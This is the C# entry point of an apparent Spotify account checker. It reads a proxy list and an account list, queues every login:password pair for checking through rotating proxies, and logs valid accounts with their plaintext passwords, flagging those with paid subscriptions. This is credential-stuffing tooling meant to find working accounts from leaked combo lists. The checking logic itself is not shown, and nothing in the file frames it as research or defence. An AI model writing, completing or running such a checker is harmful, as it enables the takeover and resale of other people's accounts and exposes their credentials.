// See https://aka.ms/new-console-template for more information
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using NLog.Extensions.Logging;
using SpotifyCheck;
using SpotifyCheck.Check;
using SpotifyCheck.Core.Models;
using SpotifyCheck.DataReaders;
using SpotifyCheck.Models;

IConfigurationRoot configuration = new ConfigurationBuilder().SetBasePath($"{Directory.GetCurrentDirectory()}\\Configurations")
    .AddConfigs()
    .AddSpotifyConfigs()
    .Build();

ServiceProvider services = new ServiceCollection().AddStartup(configuration)
    .AddSpotifyStartup(configuration)
    .AddLogging(
        loggingBuilder =>
        {
            loggingBuilder.ClearProviders();
            loggingBuilder.SetMinimumLevel(LogLevel.Trace);
            loggingBuilder.AddNLog(configuration);
        }
    )
    .BuildServiceProvider();

ServiceCollectionProxy.SetServiceProvider(services);
ILogger<Program>? logger = services.GetService<ILogger<Program>>();
WorkerMessageHandler? workerMessageHandler = services.GetService<WorkerMessageHandler>();
string? proxiesPath = configuration.GetSection("AppOptions:ProxiesPath").Value;
ProxyDataReader? proxyDataReader = services.GetService<ProxyDataReader>();

await foreach (Proxy proxy in proxyDataReader!.Read(proxiesPath!))
    workerMessageHandler!.AddProxy(proxy);

string? accountsPath = configuration.GetSection("AppOptions:AccountsPath").Value;
AccountDataReader? accountDataReader = services.GetService<AccountDataReader>();

await foreach (Account account in accountDataReader!.Read(accountsPath!))
    workerMessageHandler!.AddToQueue(new WorkerContext(account, success => OnDone(success), error => OnFail(error)));

void OnDone(AccountSuccess accountSuccess)
{
    if (accountSuccess.HasSubscription)
        logger!.LogDebug(
            "[VALID|SUB]{AccountLogin}:{AccountPassword}", accountSuccess.Account.Login, accountSuccess.Account.Password
        );
    else
        logger!.LogDebug(
            "[VALID|NOT SUB]{AccountLogin}:{AccountPassword}", accountSuccess.Account.Login, accountSuccess.Account.Password
        );
}

void OnFail(AccountError accountError)
{
    logger!.LogError(
        "[UNKNOWN ERROR] {MessageId} {AccountLogin}:{AccountPassword}", accountError.MessageId, accountError.Account.Login,
        accountError.Account.Password
    );
}